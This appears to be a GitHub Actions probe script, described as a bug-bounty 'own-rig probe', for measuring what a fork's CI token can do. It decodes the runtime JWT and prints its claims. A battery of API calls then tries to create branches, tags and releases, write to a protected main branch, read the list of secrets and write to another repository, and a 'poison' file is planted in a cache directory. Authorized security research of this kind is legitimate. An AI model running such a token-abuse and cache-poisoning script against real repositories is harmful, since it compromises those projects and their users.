#!/bin/bash
# fork-authored measurement script. Lives in a FILE so the Actions
# "##[group]Run" echo of the step cannot forge any of the values below.
API="https://api.github.com"
H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
R="$GITHUB_REPOSITORY"
TAG="mqtok-$GITHUB_RUN_ID"

st(){ # st <label> <method> <url> [json]
  local label="$1" m="$2" u="$3" body="${4:-}"
  local code
  if [ -n "$body" ]; then
    code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" -d "$body" "$u")
  else
    code=$(curl -s -o /tmp/o -w '%{http_code}' -X "$m" "${H[@]}" "$u")
  fi
  echo "MQT|REACH|$code|$label|$(head -c 160 /tmp/o | tr -d '\n')"
}

echo "MQT|CTX|event=$GITHUB_EVENT_NAME ref=$GITHUB_REF ref_name=$GITHUB_REF_NAME sha=$GITHUB_SHA repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR"
echo "MQT|PAYLOAD|$(cat probe-payload.txt)"
echo "MQT|SECRET|len=${#S}|sha256=$(printf %s "$S" | sha256sum | cut -d' ' -f1)"
echo "MQT|CACHEENV|ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL:-UNSET}|ACTIONS_RESULTS_URL=${ACTIONS_RESULTS_URL:-UNSET}|RUNTIME_TOKEN_SET=$([ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && echo yes || echo no)"
if [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]; then
  python3 -c "
import base64,json,os
t=os.environ['ACTIONS_RUNTIME_TOKEN'].split('.')[1]
t+='='*(-len(t)%4)
c=json.loads(base64.urlsafe_b64decode(t))
print('MQT|JWT|scp='+str(c.get('scp')))
ac=c.get('ac')
print('MQT|JWT|ac='+str(ac))
print('MQT|JWT|keys='+','.join(sorted(c.keys())))
" 2>&1 | sed 's/^/ /'
fi

# --- TOKEN REACH BATTERY ---
st "create-branch-ref"      POST "$API/repos/$R/git/refs"        "{\"ref\":\"refs/heads/$TAG\",\"sha\":\"$GITHUB_SHA\"}"
st "create-TAG-ref"         POST "$API/repos/$R/git/refs"        "{\"ref\":\"refs/tags/$TAG\",\"sha\":\"$GITHUB_SHA\"}"
st "publish-RELEASE"        POST "$API/repos/$R/releases"        "{\"tag_name\":\"$TAG\",\"name\":\"mqtok release $TAG\",\"body\":\"bb-team own-rig probe\"}"
st "write-QUEUE-BRANCH"     PUT  "$API/repos/$R/contents/queue-control-plane.txt" "{\"message\":\"queue control-plane write\",\"content\":\"cXVldWUtY29udHJvbC1wbGFuZQ==\",\"branch\":\"$GITHUB_REF_NAME\"}"
st "write-PROTECTED-main"   PUT  "$API/repos/$R/contents/main-must-fail.txt"      "{\"message\":\"rule test\",\"content\":\"eA==\",\"branch\":\"main\"}"
st "NEGCTRL-admin-PATCH"    PATCH "$API/repos/$R"                "{\"description\":\"neg control must fail\"}"
st "NEGCTRL-list-secrets"   GET  "$API/repos/$R/actions/secrets"
st "NEGCTRL-cross-repo"     PUT  "$API/repos/kovac-labs/zz-mq-tok-1027-absent/contents/x.txt" "{\"message\":\"x\",\"content\":\"eA==\"}"
st "SCOPE-list-installrepos" GET "$API/installation/repositories"

# --- cache payload: poison content in a data file ---
mkdir -p cachedir
cp probe-payload.txt cachedir/poison.txt
echo "MQT|CACHEDIR|$(ls -la cachedir | tr '\n' ' ')"
echo "MQT|DONE|probe.sh completed unconditionally"
